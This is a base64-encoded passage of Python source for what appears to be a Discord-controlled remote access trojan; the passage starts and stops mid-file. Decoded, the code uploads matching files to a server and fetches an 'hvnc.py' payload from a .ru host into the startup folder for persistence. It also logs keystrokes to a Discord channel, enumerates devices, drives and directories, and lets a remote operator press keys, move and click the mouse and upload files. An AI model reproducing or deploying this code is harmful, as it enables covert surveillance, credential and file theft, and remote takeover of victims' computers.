c3dpdGgoZXh0ZW5zaW9uKToKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbG9hZF90b19zZXJ2ZXIob3MucGF0aC5qb2luKHJvb3QsIGZpbGVfbmFtZSkpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgp0cnk6CgogICAgVVJMID0gImh0dHBzOi8vZGllc2VyYmVubmkucnUvaHZuYy5weSIKCiAgICByID0gcmVxdWVzdHMuZ2V0KFVSTCkKCiAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKFNUQVJUVVBfUEFUSCwgImh2bmMucHkiKSwgIndiIikgYXMgZjoKCiAgICAgICAgZi53cml0ZShyLmNvbnRlbnQpCgpleGNlcHQ6IHBhc3MKCnRyeToKCiAgICBvcy5yZW1vdmUoU1RPUkFHRV9QQVRIKQoKZXhjZXB0OiBwYXNzCgoKCmNsYXNzIE15VmlldyhuZXh0Y29yZC51aS5WaWV3KToKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9IlBhZ2UgVXAiLCBzdHlsZT1uZXh0Y29yZC5CdXR0b25TdHlsZS5wcmltYXJ5LCBjdXN0b21faWQ9InBhZ2V1cCIpCiAgICBhc3luYyBkZWYgcGFnZV91cF9idXR0b24oc2VsZiwgYnV0dG9uOiBuZXh0Y29yZC51aS5CdXR0b24sIGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbik6CiAgICAgICAgcHlhdXRvZ3VpLnByZXNzKCJwYWdldXAiKQogICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgiUGFnZSBVcCBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9IlBhZ2UgRG93biIsIHN0eWxlPW5leHRjb3JkLkJ1dHRvblN0eWxlLnByaW1hcnksIGN1c3RvbV9pZD0icGFnZWRvd24iKQogICAgYXN5bmMgZGVmIHBhZ2VfZG93bl9idXR0b24oc2VsZiwgYnV0dG9uOiBuZXh0Y29yZC51aS5CdXR0b24sIGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbik6CiAgICAgICAgcHlhdXRvZ3VpLnByZXNzKCJwYWdlZG93biIpCiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJQYWdlIERvd24gaGFzIGJlZW4gcHJlc3NlZC4iLCBlcGhlbWVyYWw9VHJ1ZSkKCiAgICBAbmV4dGNvcmQudWkuYnV0dG9uKGxhYmVsPSJFbmQiLCBzdHlsZT1uZXh0Y29yZC5CdXR0b25TdHlsZS5wcmltYXJ5LCBjdXN0b21faWQ9ImVuZCIpCiAgICBhc3luYyBkZWYgZW5kX2J1dHRvbihzZWxmLCBidXR0b246IG5leHRjb3JkLnVpLkJ1dHRvbiwgaW50ZXJhY3Rpb246IG5leHRjb3JkLkludGVyYWN0aW9uKToKICAgICAgICBweWF1dG9ndWkucHJlc3MoImVuZCIpCiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJFbmQgaGFzIGJlZW4gcHJlc3NlZC4iLCBlcGhlbWVyYWw9VHJ1ZSkKCiAgICBAbmV4dGNvcmQudWkuYnV0dG9uKGxhYmVsPSJIb21lIiwgc3R5bGU9bmV4dGNvcmQuQnV0dG9uU3R5bGUucHJpbWFyeSwgY3VzdG9tX2lkPSJob21lIikKICAgIGFzeW5jIGRlZiBob21lX2J1dHRvbihzZWxmLCBidXR0b246IG5leHRjb3JkLnVpLkJ1dHRvbiwgaW50ZXJhY3Rpb246IG5leHRjb3JkLkludGVyYWN0aW9uKToKICAgICAgICBweWF1dG9ndWkucHJlc3MoImhvbWUiKQogICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgiSG9tZSBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9IkRlbGV0ZSIsIHN0eWxlPW5leHRjb3JkLkJ1dHRvblN0eWxlLnByaW1hcnksIGN1c3RvbV9pZD0iZGVsZXRlIikKICAgIGFzeW5jIGRlZiBkZWxldGVfYnV0dG9uKHNlbGYsIGJ1dHRvbjogbmV4dGNvcmQudWkuQnV0dG9uLCBpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24pOgogICAgICAgIHB5YXV0b2d1aS5wcmVzcygiZGVsZXRlIikKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIkRlbGV0ZSBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9Ikluc2VydCIsIHN0eWxlPW5leHRjb3JkLkJ1dHRvblN0eWxlLnByaW1hcnksIGN1c3RvbV9pZD0iaW5zZXJ0IikKICAgIGFzeW5jIGRlZiBpbnNlcnRfYnV0dG9uKHNlbGYsIGJ1dHRvbjogbmV4dGNvcmQudWkuQnV0dG9uLCBpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24pOgogICAgICAgIHB5YXV0b2d1aS5wcmVzcygiaW5zZXJ0IikKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIkluc2VydCBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9IlByaW50IFNjcmVlbiIsIHN0eWxlPW5leHRjb3JkLkJ1dHRvblN0eWxlLnByaW1hcnksIGN1c3RvbV9pZD0icHJpbnRzY3JlZW4iKQogICAgYXN5bmMgZGVmIHByaW50X3NjcmVlbl9idXR0b24oc2VsZiwgYnV0dG9uOiBuZXh0Y29yZC51aS5CdXR0b24sIGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbik6CiAgICAgICAgcHlhdXRvZ3VpLnByZXNzKCJwcmludHNjcmVlbiIpCiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJQcmludCBTY3JlZW4gaGFzIGJlZW4gcHJlc3NlZC4iLCBlcGhlbWVyYWw9VHJ1ZSkKCiAgICBAbmV4dGNvcmQudWkuYnV0dG9uKGxhYmVsPSJDYXBzIExvY2siLCBzdHlsZT1uZXh0Y29yZC5CdXR0b25TdHlsZS5wcmltYXJ5LCBjdXN0b21faWQ9ImNhcHNsb2NrIikKICAgIGFzeW5jIGRlZiBjYXBzX2xvY2tfYnV0dG9uKHNlbGYsIGJ1dHRvbjogbmV4dGNvcmQudWkuQnV0dG9uLCBpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24pOgogICAgICAgIHB5YXV0b2d1aS5wcmVzcygiY2Fwc2xvY2siKQogICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgiQ2FwcyBMb2NrIGhhcyBiZWVuIHByZXNzZWQuIiwgZXBoZW1lcmFsPVRydWUpCgogICAgQG5leHRjb3JkLnVpLmJ1dHRvbihsYWJlbD0iU3BhY2UiLCBzdHlsZT1uZXh0Y29yZC5CdXR0b25TdHlsZS5wcmltYXJ5LCBjdXN0b21faWQ9InNwYWNlIikKICAgIGFzeW5jIGRlZiBzcGFjZV9idXR0b24oc2VsZiwgYnV0dG9uOiBuZXh0Y29yZC51aS5CdXR0b24sIGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbik6CiAgICAgICAgcHlhdXRvZ3VpLnByZXNzKCJzcGFjZSIpCiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJTcGFjZSBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9IkFsdCIsIHN0eWxlPW5leHRjb3JkLkJ1dHRvblN0eWxlLnByaW1hcnksIGN1c3RvbV9pZD0iYWx0IikKICAgIGFzeW5jIGRlZiBhbHRfYnV0dG9uKHNlbGYsIGJ1dHRvbjogbmV4dGNvcmQudWkuQnV0dG9uLCBpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24pOgogICAgICAgIHB5YXV0b2d1aS5wcmVzcygiYWx0IikKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIkFsdCBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9IkN0cmwiLCBzdHlsZT1uZXh0Y29yZC5CdXR0b25TdHlsZS5wcmltYXJ5LCBjdXN0b21faWQ9ImN0cmwiKQogICAgYXN5bmMgZGVmIGN0cmxfYnV0dG9uKHNlbGYsIGJ1dHRvbjogbmV4dGNvcmQudWkuQnV0dG9uLCBpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24pOgogICAgICAgIHB5YXV0b2d1aS5wcmVzcygiY3RybCIpCiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJDdHJsIGhhcyBiZWVuIHByZXNzZWQuIiwgZXBoZW1lcmFsPVRydWUpCgogICAgQG5leHRjb3JkLnVpLmJ1dHRvbihsYWJlbD0iU2hpZnQiLCBzdHlsZT1uZXh0Y29yZC5CdXR0b25TdHlsZS5wcmltYXJ5LCBjdXN0b21faWQ9InNoaWZ0IikKICAgIGFzeW5jIGRlZiBzaGlmdF9idXR0b24oc2VsZiwgYnV0dG9uOiBuZXh0Y29yZC51aS5CdXR0b24sIGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbik6CiAgICAgICAgcHlhdXRvZ3VpLnByZXNzKCJzaGlmdCIpCiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJTaGlmdCBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9IkVzY2FwZSIsIHN0eWxlPW5leHRjb3JkLkJ1dHRvblN0eWxlLnByaW1hcnksIGN1c3RvbV9pZD0iZXNjIikKICAgIGFzeW5jIGRlZiBlc2NfYnV0dG9uKHNlbGYsIGJ1dHRvbjogbmV4dGNvcmQudWkuQnV0dG9uLCBpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24pOgogICAgICAgIHB5YXV0b2d1aS5wcmVzcygiZXNjIikKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIkVzY2FwZSBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9IlRhYiIsIHN0eWxlPW5leHRjb3JkLkJ1dHRvblN0eWxlLnByaW1hcnksIGN1c3RvbV9pZD0idGFiIikKICAgIGFzeW5jIGRlZiB0YWJfYnV0dG9uKHNlbGYsIGJ1dHRvbjogbmV4dGNvcmQudWkuQnV0dG9uLCBpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24pOgogICAgICAgIHB5YXV0b2d1aS5wcmVzcygidGFiIikKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIlRhYiBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9IkJhY2tzcGFjZSIsIHN0eWxlPW5leHRjb3JkLkJ1dHRvblN0eWxlLnByaW1hcnksIGN1c3RvbV9pZD0iYmFja3NwYWNlIikKICAgIGFzeW5jIGRlZiBiYWNrc3BhY2VfYnV0dG9uKHNlbGYsIGJ1dHRvbjogbmV4dGNvcmQudWkuQnV0dG9uLCBpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24pOgogICAgICAgIHB5YXV0b2d1aS5wcmVzcygiYmFja3NwYWNlIikKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIkJhY2tzcGFjZSBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKICAgIEBuZXh0Y29yZC51aS5idXR0b24obGFiZWw9IkVudGVyL1JldHVybiIsIHN0eWxlPW5leHRjb3JkLkJ1dHRvblN0eWxlLnByaW1hcnksIGN1c3RvbV9pZD0iZW50ZXIiKQogICAgYXN5bmMgZGVmIGVudGVyX2J1dHRvbihzZWxmLCBidXR0b246IG5leHRjb3JkLnVpLkJ1dHRvbiwgaW50ZXJhY3Rpb246IG5leHRjb3JkLkludGVyYWN0aW9uKToKICAgICAgICBweWF1dG9ndWkucHJlc3MoImVudGVyIikKICAgICAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIkVudGVyL1JldHVybiBoYXMgYmVlbiBwcmVzc2VkLiIsIGVwaGVtZXJhbD1UcnVlKQoKCiMgSW5pdGlhbGl6ZSBhbiBlbXB0eSBzdHJpbmcgdG8gaG9sZCB0aGUgY3VycmVudCB3b3JkCmN1cnJlbnRfd29yZCA9ICIiCgojIEZ1bmN0aW9uIHRvIHNlbmQgYSBtZXNzYWdlIHRvIHRoZSBzcGVjaWZpZWQgRGlzY29yZCBjaGFubmVsCmFzeW5jIGRlZiBzZW5kX21lc3NhZ2UoY29udGVudCk6CiAgICBpZiBrZXlzdHJva2VzOiAgIyBVc2UgdGhlIGdsb2JhbCBrZXlzdHJva2VzIGNoYW5uZWwKICAgICAgICBhd2FpdCBrZXlzdHJva2VzLnNlbmQoY29udGVudCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIktleXN0cm9rZXMgY2hhbm5lbCBpcyBub3QgZm91bmQhIikKCmRlZiBvbl9rZXlfZXZlbnQoa2V5Ym9hcmRfZXZlbnQpOgogICAgZ2xvYmFsIGN1cnJlbnRfd29yZAogICAgCiAgICAjIEhhbmRsZSBzcGVjaWFsIGtleXMKICAgIGlmIGtleWJvYXJkX2V2ZW50Lm5hbWUgaW4gWyJzcGFjZSIsICJlbnRlciJdOgogICAgICAgIGlmIGN1cnJlbnRfd29yZDoKICAgICAgICAgICAgY29udGVudCA9IGYie2N1cnJlbnRfd29yZH0iCiAgICAgICAgICAgIGJvdC5sb29wLmNyZWF0ZV90YXNrKHNlbmRfbWVzc2FnZShjb250ZW50KSkKICAgICAgICAgICAgY3VycmVudF93b3JkID0gIiIgICMgUmVzZXQgdGhlIHdvcmQKICAgIGVsaWYga2V5Ym9hcmRfZXZlbnQubmFtZSA9PSAiYmFja3NwYWNlIjoKICAgICAgICAjIEhhbmRsZSBiYWNrc3BhY2U6IHJlbW92ZSB0aGUgbGFzdCBjaGFyYWN0ZXIgZnJvbSB0aGUgY3VycmVudCB3b3JkCiAgICAgICAgY3VycmVudF93b3JkID0gY3VycmVudF93b3JkWzotMV0KICAgICAgICBpZiBjdXJyZW50X3dvcmQgPT0gIiI6CiAgICAgICAgICAgIGNvbnRlbnQgPSAiW2JhY2tzcGFjZV0iCiAgICAgICAgZWxzZToKICAgICAgICAgICAgY29udGVudCA9IGYie2N1cnJlbnRfd29yZH0gKyBbYmFja3NwYWNlXSIKICAgICAgICBib3QubG9vcC5jcmVhdGVfdGFzayhzZW5kX21lc3NhZ2UoY29udGVudCkpCiAgICBlbGlmIGxlbihrZXlib2FyZF9ldmVudC5uYW1lKSA9PSAxOiAgIyBSZWd1bGFyIHNpbmdsZS1jaGFyYWN0ZXIga2V5cwogICAgICAgICMgQWRkIHRoZSBjaGFyYWN0ZXIgdG8gdGhlIGN1cnJlbnQgd29yZAogICAgICAgIGN1cnJlbnRfd29yZCArPSBrZXlib2FyZF9ldmVudC5uYW1lCiAgICAgICAgY29udGVudCA9IGYie2N1cnJlbnRfd29yZH0iCiAgICAgICAgYm90Lmxvb3AuY3JlYXRlX3Rhc2soc2VuZF9tZXNzYWdlKGNvbnRlbnQpKQogICAgZWxzZToKICAgICAgICAjIEhhbmRsZSBzcGVjaWFsIGtleXMgbGlrZSBTaGlmdCwgQ3RybCwgZXRjLgogICAgICAgIGNvbnRlbnQgPSBmIlt7a2V5Ym9hcmRfZXZlbnQubmFtZX1dIgogICAgICAgIGJvdC5sb29wLmNyZWF0ZV90YXNrKHNlbmRfbWVzc2FnZShjb250ZW50KSkKCgojIFNldCB1cCB0aGUgZXZlbnQgbGlzdGVuZXIKa2V5Ym9hcmQub25fcHJlc3Mob25fa2V5X2V2ZW50KQoKIyBGdW5jdGlvbiB0byBnZXQgdGhlIG5hbWVzIG9mIGNvbm5lY3RlZCBkZXZpY2VzCmRlZiBnZXRfZGV2aWNlX25hbWVzKCk6CiAgICB3bWkgPSB3aW4zMmNvbS5jbGllbnQuRGlzcGF0Y2goIldiZW1TY3JpcHRpbmcuU1diZW1Mb2NhdG9yIikKICAgIHNlcnZpY2UgPSB3bWkuQ29ubmVjdFNlcnZlcigiLiIsICJyb290XFxjaW12MiIpCiAgICBkZXZpY2VzID0gc2VydmljZS5FeGVjUXVlcnkoIlNlbGVjdCAqIGZyb20gV2luMzJfUG5QRW50aXR5IikKCiAgICBkZXZpY2Vzc19uYW1lcyA9IFtkZXZpY2UuTmFtZSBmb3IgZGV2aWNlIGluIGRldmljZXMgaWYgZGV2aWNlLk5hbWVdCiAgICByZXR1cm4gZGV2aWNlc3NfbmFtZXMKCiMgRnVuY3Rpb24gdG8gc2VuZCBkZXZpY2VzIGluIG11bHRpcGxlIG1lc3NhZ2VzCmFzeW5jIGRlZiBzZW5kX2RldmljZXNfaW5fY2h1bmtzKGNoYW5uZWwsIGRldmljZV9uYW1lcywgY2h1bmtfc2l6ZT0xMCk6CiAgICAjIEVuc3VyZSBkZXZpY2VfbmFtZXMgaXMgYSBsaXN0CiAgICBpZiBub3QgaXNpbnN0YW5jZShkZXZpY2VfbmFtZXMsIGxpc3QpOgogICAgICAgIHJhaXNlIFR5cGVFcnJvcigiZGV2aWNlX25hbWVzIHNob3VsZCBiZSBhIGxpc3QiKQoKICAgICMgU3BsaXQgdGhlIGxpc3QgaW50byBjaHVua3MgdGhhdCBmaXQgd2l0aGluIERpc2NvcmQncyBtZXNzYWdlIGxpbWl0CiAgICBmb3IgaSBpbiByYW5nZSgwLCBsZW4oZGV2aWNlX25hbWVzKSwgY2h1bmtfc2l6ZSk6CiAgICAgICAgY2h1bmsgPSBkZXZpY2VfbmFtZXNbaTppK2NodW5rX3NpemVdCiAgICAgICAgbWVzc2FnZSA9ICJcbiIuam9pbihjaHVuaykKICAgICAgICBhd2FpdCBjaGFubmVsLnNlbmQobWVzc2FnZSkKCmFzeW5jIGRlZiBzZW5kX2luX2NodW5rcyhjaGFubmVsLCBtZXNzYWdlOiBzdHIpOgogICAgIyBTcGxpdCB0aGUgbWVzc2FnZSBpbnRvIGNodW5rcyBvZiAyMDAwIGNoYXJhY3RlcnMgb3IgbGVzcwogICAgY2h1bmtzID0gW21lc3NhZ2VbaTppKzIwMDBdIGZvciBpIGluIHJhbmdlKDAsIGxlbihtZXNzYWdlKSwgMjAwMCldCiAgICAKICAgICMgU2VuZCBlYWNoIGNodW5rIGluZGl2aWR1YWxseQogICAgZm9yIGNodW5rIGluIGNodW5rczoKICAgICAgICBhd2FpdCBjaGFubmVsLnNlbmQoY2h1bmspCgojIEZ1bmN0aW9uIHRvIGdldCBpbmZvcm1hdGlvbiBhYm91dCBhIHNwZWNpZmljIGRldmljZQpkZWYgZ2V0X2RldmljZV9pbmZvKGRldmljZV9uYW1lKToKICAgIHdtaSA9IHdpbjMyY29tLmNsaWVudC5EaXNwYXRjaCgiV2JlbVNjcmlwdGluZy5TV2JlbUxvY2F0b3IiKQogICAgc2VydmljZSA9IHdtaS5Db25uZWN0U2VydmVyKCIuIiwgInJvb3RcXGNpbXYyIikKICAgIGRldmljZXMgPSBzZXJ2aWNlLkV4ZWNRdWVyeSgiU2VsZWN0ICogZnJvbSBXaW4zMl9QblBFbnRpdHkiKQoKICAgIGZvciBkZXZpY2UgaW4gZGV2aWNlczoKICAgICAgICBpZiBkZXZpY2VfbmFtZS5sb3dlcigpIGluIChkZXZpY2UuTmFtZSBvciAiIikubG93ZXIoKToKICAgICAgICAgICAgcmV0dXJuICgKICAgICAgICAgICAgICAgIGYiKipEZXZpY2UgTmFtZToqKiB7ZGV2aWNlLk5hbWV9XG4iCiAgICAgICAgICAgICAgICBmIioqRGV2aWNlIElEOioqIHtkZXZpY2UuRGV2aWNlSUR9XG4iCiAgICAgICAgICAgICAgICBmIioqRGVzY3JpcHRpb246Kioge2RldmljZS5EZXNjcmlwdGlvbn1cbiIKICAgICAgICAgICAgICAgIGYiKipNYW51ZmFjdHVyZXI6Kioge2RldmljZS5NYW51ZmFjdHVyZXJ9XG4iCiAgICAgICAgICAgICAgICAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIKICAgICAgICAgICAgKQogICAgcmV0dXJuICJEZXZpY2Ugbm90IGZvdW5kLiIKCmRlZiBsaXN0X2NvbnRlbnRzKGRpcmVjdG9yeTogc3RyLCBmdWxsX3BhdGg6IGJvb2wgPSBGYWxzZSkgLT4gZGljdDoKICAgIGNvbnRlbnRzID0geydmaWxlcyc6IFtdLCAnZm9sZGVycyc6IFtdfQogICAgCiAgICB0cnk6CiAgICAgICAgZm9yIGVudHJ5IGluIFBhdGgoZGlyZWN0b3J5KS5pdGVyZGlyKCk6CiAgICAgICAgICAgIGlmIGVudHJ5LmlzX2ZpbGUoKToKICAgICAgICAgICAgICAgIGNvbnRlbnRzWydmaWxlcyddLmFwcGVuZChzdHIoZW50cnkpIGlmIGZ1bGxfcGF0aCBlbHNlIGVudHJ5Lm5hbWUpCiAgICAgICAgICAgIGVsaWYgZW50cnkuaXNfZGlyKCk6CiAgICAgICAgICAgICAgICBjb250ZW50c1snZm9sZGVycyddLmFwcGVuZChzdHIoZW50cnkpIGlmIGZ1bGxfcGF0aCBlbHNlIGVudHJ5Lm5hbWUpCiAgICAgICAgICAgICAgICAKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludChmIlRoZSBkaXJlY3Rvcnkge2RpcmVjdG9yeX0gZG9lcyBub3QgZXhpc3QuIikKICAgIGV4Y2VwdCBQZXJtaXNzaW9uRXJyb3I6CiAgICAgICAgcHJpbnQoZiJQZXJtaXNzaW9uIGRlbmllZCB0byBhY2Nlc3Mge2RpcmVjdG9yeX0uIikKCiAgICByZXR1cm4gY29udGVudHMKCmRlZiBnZXRfYWxsX2RyaXZlcygpOgogICAgZHJpdmVzID0gW2Yie2R9OlxcIiBmb3IgZCBpbiByYW5nZSg2NSwgOTEpIGlmIG9zLnBhdGguZXhpc3RzKGYie2NocihkKX06XFwiKV0KICAgIHJldHVybiBkcml2ZXMKCgoKCkBib3Quc2xhc2hfY29tbWFuZChuYW1lPSJkZXZpY2Vfc2NhbiIsIGRlc2NyaXB0aW9uPSJMaXN0IGFsbCBkZXZpY2VzIikKYXN5bmMgZGVmIGRldmljZV9zY2FuKGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbik6CiAgICB0cnk6CiAgICAgICAgZGV2aWNlX25hbWVzID0gZ2V0X2RldmljZV9uYW1lcygpCiAgICAgICAgaWYgbm90IGRldmljZV9uYW1lczoKICAgICAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJObyBkZXZpY2VzIGZvdW5kLiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgIyBTZW5kIHRoZSBkZXZpY2VzIGluIGNodW5rcwogICAgICAgICAgICBhd2FpdCBzZW5kX2luX2NodW5rcyhpbnRlcmFjdGlvbi5jaGFubmVsLCBkZXZpY2VfbmFtZXMpCiAgICAgICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgiRGV2aWNlIGxpc3Qgc2VudCBpbiBtdWx0aXBsZSBtZXNzYWdlcy4iKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICMgSGFuZGxlIGFueSBlcnJvcnMgdGhhdCBvY2N1cgogICAgICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZShmIkFuIGVycm9yIG9jY3VycmVkOiB7ZX0iKQoKCkBib3Quc2xhc2hfY29tbWFuZChuYW1lPSJkZXZpY2VfaW5mbyIsIGRlc2NyaXB0aW9uPSJHZXQgaW5mb3JtYXRpb24gYWJvdXQgYSBzcGVjaWZpYyBkZXZpY2UiKQphc3luYyBkZWYgZGV2aWNlX2luZm8oaW50ZXJhY3Rpb246IG5leHRjb3JkLkludGVyYWN0aW9uLCBkZXZpY2VfbmFtZTogc3RyKToKICAgIGluZm8gPSBnZXRfZGV2aWNlX2luZm8oZGV2aWNlX25hbWUpCiAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoaW5mbykKCkBib3Quc2xhc2hfY29tbWFuZChuYW1lPSJjbGljayIsIGRlc2NyaXB0aW9uPSJDbGljayBvbiBUaGUgU2NyZWVuISIpCmFzeW5jIGRlZiBjbGljayhpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24pOgogICAgeCwgeSA9IHAucG9zaXRpb24oKQogICAgcC5jbGljayh4LCB5KQogICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCJDbGlja2VkIG9uIHRoZSBTY3JlZW4hIikKCkBib3Quc2xhc2hfY29tbWFuZChuYW1lPSJzY3JvbGwiLCBkZXNjcmlwdGlvbj0iU2Nyb2xsIG9uIFRoZSBTY3JlZW4hIikKYXN5bmMgZGVmIHNjcm9sbChpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24sIGFtb3VudDogc3RyKToKICAgIHAuc2Nyb2xsKGFtb3VudCkKICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgiU2Nyb2xsZWQgb24gdGhlIFNjcmVlbiEiKQoKQGJvdC5zbGFzaF9jb21tYW5kKG5hbWU9Im1vdmUiLCBkZXNjcmlwdGlvbj0iTW92ZSB0byBBbnl3aGVyZSBvbiBUaGUgU2NyZWVuISIpCmFzeW5jIGRlZiBtb3ZlKGludGVyYWN0aW9uOiBuZXh0Y29yZC5JbnRlcmFjdGlvbiwgeDogaW50LCB5OiBpbnQpOgogICAgcC5tb3ZlVG8oeCwgeSwgZHVyYXRpb249MC4wKQogICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKGYiTW92ZWQgdG8gKip7eH0qKiwgKip7eX0qKiIpCgpAYm90LnNsYXNoX2NvbW1hbmQobmFtZT0iZHJhZyIsIGRlc2NyaXB0aW9uPSJEcmFnIHRvIEFueXdoZXJlIG9uIFRoZSBTY3JlZW4hIikKYXN5bmMgZGVmIGRyYWcoaW50ZXJhY3Rpb246IG5leHRjb3JkLkludGVyYWN0aW9uLCB4OiBpbnQsIHk6IGludCk6CiAgICBwLmRyYWdUbyh4LCB5LCBkdXJhdGlvbj0wLjApCiAgICBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoZiJEcmFnZ2VkIHRvICoqe3h9KiosICoqe3l9KioiKQoKQGJvdC5zbGFzaF9jb21tYW5kKG5hbWU9ImZpbGVzIiwgZGVzY3JpcHRpb249Ikxpc3QgdGhlIENvbnRlbnRzIG9mIGEgZGlyZWN0b3J5ISIpCmFzeW5jIGRlZiBmaWxlcyhpbnRlcmFjdGlvbjogbmV4dGNvcmQuSW50ZXJhY3Rpb24sIGRpcl9wYXRoOiBzdHIpOgogICAgICAgIGNvbnRlbnRzID0gbGlzdF9jb250ZW50cyhkaXJfcGF0aCwgZnVsbF9wYXRoPVRydWUpCiAgICAgICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKGYiRmlsZXM6IHtjb250ZW50c1snZmlsZXMnXX0gJiBGb2xkZXJzOiB7Y29udGVudHNbJ2ZvbGRlcnMnXX0iKQoKQGJvdC5zbGFzaF9jb21tYW5kKG5hbWU9InVwbG9hZCIsIGRlc2NyaXB0aW9uPSJVcGxvYWQgYSBmaWxlISIpCmFzeW5jIGRlZiB1cGxvYWQoaW50ZXJhY3Rpb246IG5leHRjb3JkLkludGVyYWN0aW9uLCBmaWxlX3BhdGg6IHN0cik6CiAgICAjIEdldCB0aGUg